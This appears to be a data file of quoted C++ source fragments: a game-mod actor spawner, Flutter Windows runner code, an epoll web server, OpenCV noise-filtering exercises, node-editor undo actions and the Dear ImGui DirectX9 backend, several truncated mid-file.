    "#include \"actorspawner.hpp\"\r\n\r\nncp_over(0x020399D4) static constexpr const ActorProfile* profile = &ActorSpawner::profile;\r\n\r\nvoid ActorSpawner::doSpawn() {\r\n\r\n\tVec3 sPos = position;\r\n\tsPos.y -= 0x10000;\t\t// Origin pos: Bottom-left of sprite\r\n\r\n\tsPos.x += spawnerSettings->offsetX * 0x1000;\r\n\tsPos.y += spawnerSettings->offsetY * 0x1000;\r\n\r\n\tu16 objID = spawnerSettings->objectID;\r\n\r\n\tif (sActor) {\r\n\t\tStageEntity* spawnedActor = (StageEntity*)spawnActor(objID, spawnerSettings->settings, &sPos);\r\n\t\tif (objID == 103 || objID == 185) {\r\n\t\t\tspawnedActor->collisionSwitch |= 0x4620; // manually set spikedball collision switch lmao\r\n\t\t}\t\t\t\t\t\t\t\t\t\t\t // has to be a better way of doing this\r\n\t}\r\n\r\n\tsPos.x += spawnerSettings->particleOffsetX * 0x1000;\r\n\tsPos.y += spawnerSettings->particleOffsetY * 0x1000;\r\n\r\n\tif (sParticles) {\r\n\t\tParticle::Handler::createParticle(spawnerSettings->particleID, sPos);\r\n\t}\r\n\r\n\tif (sSFX) {\r\n\t\tSound::playSFX(spawnerSettings->sfxID, &sPos);\r\n\t}\r\n\r\n\tactorSpawned = true;\r\n}\r\n\t\r\ns32 ActorSpawner::onCreate() {\r\n\r\n\tactorSpawned = false;\r\n\r\n\t//activeSize = Vec2(5000,5000);\r\n\r\n\tspawnerSettingsID = (settings & 0xFF0000) >> 16;\r\n\tspawnerSettings = (ActorSpawnerSettings*)(Stage::stageBlocks.objectBanks + 16 + spawnerSettingsID*16);\r\n\r\n\tsActor = (settings & 0x4000) == 0;\r\n\tsParticles = (settings & 0x1000) == 0;\r\n\tsSFX = (settings & 0x2000) == 0;\r\n\tsFirstTick = (settings & 0x8000) == 0;\r\n\r\n\teventID = settings >> 24;\r\n\teventWasActive = false;\r\n\tspawnDelay = settings & 0xFFF;\r\n\ttimer = 0;\r\n\r\n\t//Log() << \"settings: \" << Log::Hex << settings << \"\\n\";\r\n\t//Log() << \"sfxID: \" << Log::Dec << spawnerSettings->sfxID << \"\\n\";\r\n\r\n\treturn 1;\r\n}\r\n\r\nbool ActorSpawner::updateMain() {\r\n\r\n\tif (eventID == 0 && spawnDelay == 0)\r\n\t\treturn 1;\r\n\r\n\tif (spawnDelay == 0) { // no spawn delay set\r\n\t\tif (Stage::getEvent(eventID) && actorSpawned)\r\n\t\t\treturn 1;\r\n\r\n\t\tif (!Stage::getEvent(eventID) && actorSpawned) \r\n\t\t\tactorSpawned = false;\r\n\r\n\t\tif (Stage::getEvent(eventID) && !actorSpawned){ \r\n\t\t\tdoSpawn();\r\n\t\t}\r\n\r\n\t} else {\r\n\t\tif (eventID == 0) {\r\n\t\t\teventActive = true;\r\n\t\t}\r\n\t\telse\r\n\t\t\teventActive = Stage::getEvent(eventID);\r\n\r\n\t\tif (eventWasActive && !eventActive)\r\n\t\t\ttimer = 0;\r\n\r\n\t\tif (eventActive) {\r\n\t\t\tif (sFirstTick && !eventWasActive)\r\n\t\t\t\tdoSpawn();\r\n\t\t\tif (timer > spawnDelay) {\r\n\t\t\t\tdoSpawn();\r\n\t\t\t\ttimer = 0;\r\n\t\t\t}\r\n\t\t\ttimer++;\r\n\t\t}\r\n\r\n\t\teventWasActive = eventActive;\r\n\t}\r\n\r\n\tdestroyInactive(0);\r\n\r\n\treturn 1;\r\n}\r\n\r\ns32 ActorSpawner::onDestroy() {\r\n\treturn 1;\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"project_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/**\n * @file webserver.cpp\n * @author Fansure Grin\n * @date 2023-03-31\n * @brief source files for webserver\n*/\n#include <unistd.h>\n#include <fcntl.h>\n#include <cstring>\n#include \"webserver.h\"\n\n\nWebServer::WebServer(\n// socket\nconst string &ip_, int listen_port_, int timeout_, bool open_linger_, int trig_mode_,\n// database\nconst char *sql_host, int sql_port, const char *sql_username,\nconst char *sql_passwd, const char *db_name, int conn_pool_num,\n// logconn_pool_num\nbool open_log, level_type log_level, int log_queue_size, const char *log_path,\nconst string &src_dir_, int thread_pool_num) {\n    init(ip_, listen_port_, timeout_, open_linger_, trig_mode_,\n        sql_host, sql_port, sql_username, sql_passwd, db_name, conn_pool_num,\n        open_log, log_level, log_queue_size, log_path,\n        src_dir_, thread_pool_num);\n}\n\n\nvoid WebServer::init(\n// socket\nconst string &ip_, int listen_port_, int timeout_, bool open_linger_, int trig_mode_,\n// database\nconst char *sql_host, int sql_port, const char *sql_username,\nconst char *sql_passwd, const char *db_name, int conn_pool_num,\n// log\nbool open_log, level_type log_level, int log_queue_size, const char *log_path,\nconst string &src_dir_, int thread_pool_num)\n{\n    ip = ip_;\n    listen_port = listen_port_;\n    timeout = timeout_;\n    open_linger = open_linger_;\n    src_dir = src_dir_;\n    is_close = false;\n    thread_pool.reset(new ThreadPool(thread_pool_num));\n    tm_heap.reset(new TimeHeap());\n    epoller.reset(new Epoller());\n\n    HttpConn::user_count = 0;\n    HttpConn::src_dir = src_dir;\n    SQLConnPool::get_instance()->init(sql_host, sql_port, sql_username,\n        sql_passwd, db_name, conn_pool_num);\n    init_event_mode(trig_mode_);\n    if (!init_socket()) {\n        is_close = true;\n    }\n\n    if (open_log) {\n        Log::get_instance()->init(log_level, log_path, \".log\", log_queue_size);\n        if (is_close) {\n            LOG_ERROR(\"====== Server initialization error ======\");\n        } else {\n            LOG_INFO(\"====== Server initialized ======\");\n            LOG_INFO(\"Listen on %s:%d, open-linger: %s\", ip.c_str(), listen_port,\n                (open_linger ? \"true\" : \"false\"));\n            LOG_INFO(\"Listen mode: %s, Open connection mode: %s\",\n                ((listen_event & EPOLLET) ? \"ET\" : \"LT\"),\n                ((conn_event & EPOLLET) ? \"ET\" : \"LT\"));\n            LOG_INFO(\"Log level: %d\", log_level);\n            LOG_INFO(\"Resource directory: %s\", src_dir.c_str());\n            LOG_INFO(\"Number of connections in SQL-Pool: %d\", conn_pool_num);\n            LOG_INFO(\"Number of threads in Thread-Pool: %d\", thread_pool_num);\n        }\n    }\n}\n\nWebServer::WebServer(const Config &cfg) {\n    init(\n        cfg.get_string(\"listen_ip\"),\n        cfg.get_integer(\"listen_port\"),\n        cfg.get_integer(\"timeout\"),\n        cfg.get_integer(\"trig_mode\"),\n        cfg.get_bool(\"open_linger\"),\n        cfg.get_string(\"sql_host\").c_str(),\n        cfg.get_integer(\"sql_port\"),\n        cfg.get_string(\"sql_username\").c_str(),\n        cfg.get_string(\"sql_passwd\").c_str(),\n        cfg.get_string(\"db_name\").c_str(),\n        cfg.get_integer(\"conn_pool_num\"),\n        cfg.get_bool(\"open_log\"),\n        cfg.get_integer(\"log_level\"),\n        cfg.get_integer(\"log_queue_size\"),\n        cfg.get_string(\"log_path\").c_str(),\n        cfg.get_string(\"src_dir\"),\n        cfg.get_integer(\"thread_pool_num\")\n    );\n}\n\nWebServer::~WebServer() {\n    close(listen_fd);\n    is_close = true;\n    SQLConnPool::get_instance()->close();\n}\n\nvoid WebServer::start() {\n    int wait_tm = 1;\n    if (!is_close) {\n        LOG_INFO(\"====== Server start ======\");\n    }\n    while (!is_close) {\n        if (timeout > 0) {\n            // \u5904\u7406\u5b9a\u65f6\u4e8b\u4ef6\n            wait_tm = tm_heap->get_next_tick();\n        }\n        int event_cnt = epoller->wait(wait_tm);\n        for (int i=0; i<event_cnt; ++i) {\n            int fd = epoller->get_event_fd(i);\n            uint32_t events = epoller->get_events(i);\n            if (fd == listen_fd) {\n                deal_listen();\n            } else if (events & (EPOLLRDHUP | EPOLLHUP | EPOLLERR)) {\n                if (users.count(fd)) {\n                    close_conn(&users[fd]);\n                }\n            } else if (events & EPOLLIN) {\n                if (users.count(fd)) {\n                    deal_read(&users[fd]);\n                }\n            } else if (events & EPOLLOUT) {\n                if (users.count(fd)) {\n                    deal_write(&users[fd]);\n                }\n            } else {\n                LOG_ERROR(\"Unexpected event!\");\n            }\n        }\n    }\n}\n\nbool WebServer::init_socket() {\n    int ret;\n    \n    struct sockaddr_in addr;\n    if (listen_port > 65535 || listen_port < 1024) {\n        LOG_ERROR(\"Invalid port number: %d (1024 <= port <= 65535)\", listen_port);\n        return false;\n    }\n    addr.sin_family = AF_INET;\n    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);\n    addr.sin_port = htons(listen_port);\n\n    listen_fd = socket(PF_INET, SOCK_STREAM, 0);\n    if (liste",
    "//\n// Created by Alan on 2024/3/22.\n//\n#include <opencv2/opencv.hpp>\n#include <random>\n\nusing namespace cv;\nusing namespace std;\n\n// \u51fd\u6570\u6dfb\u52a0\u9ad8\u65af\u566a\u58f0\nvoid addGaussianNoise(Mat &image) {\n    Mat noise(image.size(), image.type());\n    double mean = 0.0;\n    double stddev = 30.0;  // \u6807\u51c6\u5dee\n    randn(noise, mean, stddev); // \u751f\u6210\u6b63\u6001\u5206\u5e03\u968f\u673a\u6570\n    image += noise;  // \u6dfb\u52a0\u566a\u58f0\n}\n\n// \u51fd\u6570\u6dfb\u52a0\u6912\u76d0\u566a\u58f0\nvoid addSaltAndPepperNoise(Mat &image, double saltPerc, double pepperPerc) {\n    int rows = image.rows;\n    int cols = image.cols;\n    int ch = image.channels();\n    int num_salt = static_cast<int>((rows * cols * ch) * saltPerc);\n    int num_pepper = static_cast<int>((rows * cols * ch) * pepperPerc);\n\n    for (int i = 0; i < num_salt; i++) {\n        int r = rand() % rows;\n        int c = rand() % cols;\n        int ch = rand() % 3;\n        image.at<Vec3b>(r, c)[ch] = 255;\n    }\n\n    for (int i = 0; i < num_pepper; i++) {\n        int r = rand() % rows;\n        int c = rand() % cols;\n        int ch = rand() % 3;\n        image.at<Vec3b>(r, c)[ch] = 0;\n    }\n}\n\n// TODO: OpenCV\u5b9e\u73b0\u9ad8\u65af\u6ee4\u6ce2\nvoid GaussianBlurByOpenCV(const Mat &image, Mat &result, int size=5, double sigma=5) {\n    GaussianBlur(image, result, Size(size, size), sigma, 0);\n}\n\n// \u751f\u6210\u9ad8\u65af\u6ee4\u6ce2\u6838\nMat generateGaussKernel(int size, double sigma){\n    Size wsize(size, size);\n    Mat Kernel = Mat(wsize,CV_64F);\n    int center = (size - 1) / 2;\n    double sum = 0.0;\n    double x, y;\n    for (int i = 0; i < size; ++i){\n        y = pow(i - center, 2);\n        for (int j = 0; j < size; ++j){\n            x = pow(j - center, 2);\n            //\u56e0\u4e3a\u6700\u540e\u90fd\u8981\u5f52\u4e00\u5316\u7684\uff0c\u5e38\u6570\u90e8\u5206\u53ef\u4ee5\u4e0d\u8ba1\u7b97\uff0c\u4e5f\u51cf\u5c11\u4e86\u8fd0\u7b97\u91cf\n            double g = exp(-(x + y) / (2 * sigma*sigma));\n            Kernel.at<double>(i, j) = g;\n            sum += g;\n        }\n    }\n    Kernel = Kernel / sum;\n    return Kernel;\n}\n\n// TODO: \u5b9e\u73b0\u9ad8\u65af\u6ee4\u6ce2\nvoid GaussianFilter(const Mat& src, Mat& dst, int size=5, double sigma=5) {\n    Mat Kernel;\n    Kernel = generateGaussKernel(size, sigma);\n    int border = size / 2;\n    dst = Mat::zeros(src.size(), src.type());\n    //\u8fb9\u754c\u586b\u5145\n    Mat newSrc;\n    copyMakeBorder(src, newSrc, border, border, border, border, BORDER_REFLECT);\n\n    for (int i = border; i < src.rows + border; ++i) { // \u5916\u5c42\u5faa\u73af\u904d\u5386\u539f\u56fe\u50cf\n        for (int j = border; j < src.cols + border; ++j) { // \u5916\u5c42\u5faa\u73af\u904d\u5386\u539f\u56fe\u50cf\n            double sum = 0.0;\n            for (int m = 0; m < size; ++m) { // \u5185\u5c42\u5faa\u73af\u904d\u5386\u5377\u79ef\u6838\n                for (int n = 0; n < size; ++n) { // \u5185\u5c42\u5faa\u73af\u904d\u5386\u5377\u79ef\u6838\n                    // \u5377\u79ef\u64cd\u4f5c\n                    sum += newSrc.at<uchar>(i + m - border, j + n - border) * Kernel.at<double>(m, n);\n                }\n            }\n            dst.at<uchar>(i - border, j - border) = sum;\n        }\n    }\n}\n\n// TODO: OpenCV\u5b9e\u73b0\u4e2d\u503c\u6ee4\u6ce2\nvoid MedianBlurByOpenCV(const Mat &src, Mat &dst, int size=5) {\n    medianBlur(src, dst, size);\n}\n\n// TODO: \u5b9e\u73b0\u4e2d\u503c\u6ee4\u6ce2\nvoid MedianFilter(const Mat &src, Mat &dst, int size=5) {\n    int border = size / 2;\n    dst = Mat::zeros(src.size(), src.type());\n    //\u8fb9\u754c\u586b\u5145\n    Mat newSrc;\n    copyMakeBorder(src, newSrc, border, border, border, border, BORDER_REFLECT);\n\n    for (int i = border; i < src.rows + border; ++i) { // \u5916\u5c42\u5faa\u73af\u904d\u5386\u539f\u56fe\u50cf\n        for (int j = border; j < src.cols + border; ++j) { // \u5916\u5c42\u5faa\u73af\u904d\u5386\u539f\u56fe\u50cf\n           vector<uchar> vec;\n            for (int m = 0; m < size; ++m) { // \u5185\u5c42\u5faa\u73af\u904d\u5386\u5377\u79ef\u6838\n                for (int n = 0; n < size; ++n) { // \u5185\u5c42\u5faa\u73af\u904d\u5386\u5377\u79ef\u6838\n                    // \u8ba1\u7b97\u4e2d\u503c\n                    vec.push_back(newSrc.at<uchar>(i + m - border, j + n - border));\n                }\n            }\n           sort(vec.begin(), vec.end());\n            dst.at<uchar>(i - border, j - border) = vec[vec.size() / 2];\n        }\n    }\n}\n\n\nint main() {\n    // \u8bfb\u53d6\u56fe\u50cf\n    Mat image = imread(\"../TJU.jpg\");\n    if (image.empty()) {\n       cerr << \"Image load failed\" <<endl;\n        return -1;\n    }\n    // \u539f\u56fe\u4e3a\u5f69\u8272, \u7070\u5316\n    cvtColor(image, image, COLOR_BGR2GRAY);\n    imwrite(\"../Assign1/TJU_Origin.jpg\", image);\n\n    // \u6dfb\u52a0\u9ad8\u65af\u566a\u58f0\n    Mat imageWithGaussianNoise = image.clone();\n    addGaussianNoise(imageWithGaussianNoise);\n    imwrite(\"../Assign1/TJU_GaussianNoise.jpg\", imageWithGaussianNoise);\n\n    // \u6dfb\u52a0\u6912\u76d0\u566a\u58f0\n    Mat imageWithSaltAndPepperNoise = image.clone();\n    addSaltAndPepperNoise(imageWithSaltAndPepperNoise, 0.05, 0.05);\n    imwrite(\"../Assign1/TJU_SaltAndPepperNoise.jpg\", imageWithSaltAndPepperNoise);\n\n\n    // \u9ad8\u65af\u6ee4\u6ce2: \u5bf9\u52a0\u6709\u9ad8\u65af\u566a\u58f0\u7684\u56fe\u50cf\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\n    Mat imageGaussianBlurByOpenCV;\n    Mat imageGaussianBlurBySelf;\n    Mat imageGaussianBlur = imageWithGaussianNoise.clone();\n    GaussianBlurByOpenCV(imageGaussianBlur, imageGaussianBlurByOpenCV, 5, 0.8);\n    GaussianFilter(imageGaussianBlur, imageGaussianBlurBySelf, 5, 0.8);\n    imshow(\"Gaussian Blur with Gaussian Noise\", imageGaussianBlurByOpenCV);\n    imshow(\"Gaussian Blur with Gaussian Noise by Self\", imageGaussianBlurBySelf);\n    imwrite(\"../Assign1/TJU_GaussianBlurByOpenCV.jpg\", imageGaussianBlurByOpenCV);\n    imwrite(\"../Assign1/TJU_GaussianBlurBySelf.jpg\", imageGaussianBlurBySelf);\n\n\n    // \u4e2d\u503c\u6ee4\u6ce2: \u5bf9\u52a0\u6709\u6912\u76d0\u566a\u58f0\u7684\u56fe\u50cf\u8fdb\u884c\u4e2d\u503c\u6ee4\u6ce2\n    Mat imageMedianBlurByOpenCV;\n    Mat imageMedianBlurBySelf;\n    Mat imageMedian",
    "#include \"Actions.h\"\r\n#include \"Node.h\"\r\n#include \"NodeView.h\"\r\nMoveNodeAction::MoveNodeAction(NodeView& nodeView, std::shared_ptr<Node> node, double oldX, double oldY, double newX, double newY)\r\n    : nodeView_(nodeView), node_(std::move(node)), oldX_(oldX), oldY_(oldY), newX_(newX), newY_(newY) {}\r\n\r\nvoid MoveNodeAction::doAction() {\r\n    node_->set_new_position(newX_, newY_);\r\n    this->nodeView_.move(*node_, newX_, newY_);\r\n}\r\n\r\nvoid MoveNodeAction::undoAction() {\r\n    node_->set_new_position(oldX_, oldY_);\r\n    this->nodeView_.move(*node_, oldX_, oldY_);\r\n}\r\n\r\n\r\n/*DeleteEdgesAction(NodeView& nodeView, std::vector<std::shared_ptr<Edge>>& edgesToDelete)\r\n    : nodeView_(nodeView), edgesToDelete(std::move(edgesToDelete)) {}\r\n\r\nvoid DeleteEdgesAction::doAction(){\r\n    for (auto& edge : edgesToDelete) {\r\n        \r\n    }\r\n}\r\n\r\nvoid DeleteEdgesAction::undoAction(){\r\n    \r\n    for (auto& edge : edgesToDelete) {\r\n        \r\n    }\r\n}*/\r\n\r\nCreateEdgeAction::CreateEdgeAction(NodeView& nodeView, std::shared_ptr<Edge> edge)\r\n    : nodeView_(nodeView), edge_(std::move(edge)) {}\r\n\r\nvoid CreateEdgeAction::doAction() {    \r\n    nodeView_.addEdge(edge_);\r\n}\r\n\r\nvoid CreateEdgeAction::undoAction() {    \r\n    nodeView_.removeEdge(edge_);\r\n}",
    "// dear imgui: Renderer Backend for DirectX9\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'LPDIRECT3DTEXTURE9' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: DirectX9: Explicitly disable texture state stages after >= 1.\n//  2021-05-19: DirectX9: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-23: DirectX9: Explicitly setting up more graphics states to increase compatibility with unusual non-default states.\n//  2021-03-18: DirectX9: Calling IDirect3DStateBlock9::Capture() after CreateStateBlock() as a workaround for state restoring issues (see #3857).\n//  2021-03-03: DirectX9: Added support for IMGUI_USE_BGRA_PACKED_COLOR in user's imconfig file.\n//  2021-02-18: DirectX9: Change blending equation to preserve alpha in output buffer.\n//  2019-05-29: DirectX9: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX9: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2019-03-29: Misc: Fixed erroneous assert in ImGui_ImplDX9_InvalidateDeviceObjects().\n//  2019-01-16: Misc: Disabled fog before drawing UI's. Fixes issue #2288.\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-06-08: Misc: Extracted imgui_impl_dx9.cpp/.h away from the old combined DX9+Win32 example.\n//  2018-06-08: DirectX9: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-05-07: Render: Saving/restoring Transform because they don't seem to be included in the StateBlock. Setting shading mode to Gouraud.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX9_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_dx9.h\"\n\n// DirectX\n#include <d3d9.h>\n\n// DirectX data\nstruct ImGui_ImplDX9_Data\n{\n    LPDIRECT3DDEVICE9           pd3dDevice;\n    LPDIRECT3DVERTEXBUFFER9     pVB;\n    LPDIRECT3DINDEXBUFFER9      pIB;\n    LPDIRECT3DTEXTURE9          FontTexture;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX9_Data()        { memset((void*)this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct CUSTOMVERTEX\n{\n    float    pos[3];\n    D3DCOLOR col;\n    float    uv[2];\n};\n#define D3DFVF_CUSTOMVERTEX (D3DFVF_XYZ|D3DFVF_DIFFUSE|D3DFVF_TEX1)\n\n#ifdef IMGUI_USE_BGRA_PACKED_COLOR\n#define IMGUI_COL_TO_DX9_ARGB(_COL)     (_COL)\n#else\n#define IMGUI_COL_TO_DX9_ARGB(_COL)     (((_COL) & 0xFF00FF00) | (((_COL) & 0xFF0000) >> 16) | (((_COL) & 0xFF) << 16))\n#endif\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX9_Data* ImGui_ImplDX9_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX9_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nstatic void ImGui_ImplDX9_SetupRenderState(ImDrawData* draw_data)\n{\n    ImGui_ImplDX9_Data* bd = ImGui_ImplDX9_GetBackendData();\n\n    // Setup viewport\n    D3DVIEWPORT9 vp;\n    vp.X = vp.Y = 0;\n    vp.Width = (DWORD)draw_data->DisplaySize.x;\n    vp.Height = (DWORD)draw_data->DisplaySize.y;\n    vp.MinZ = 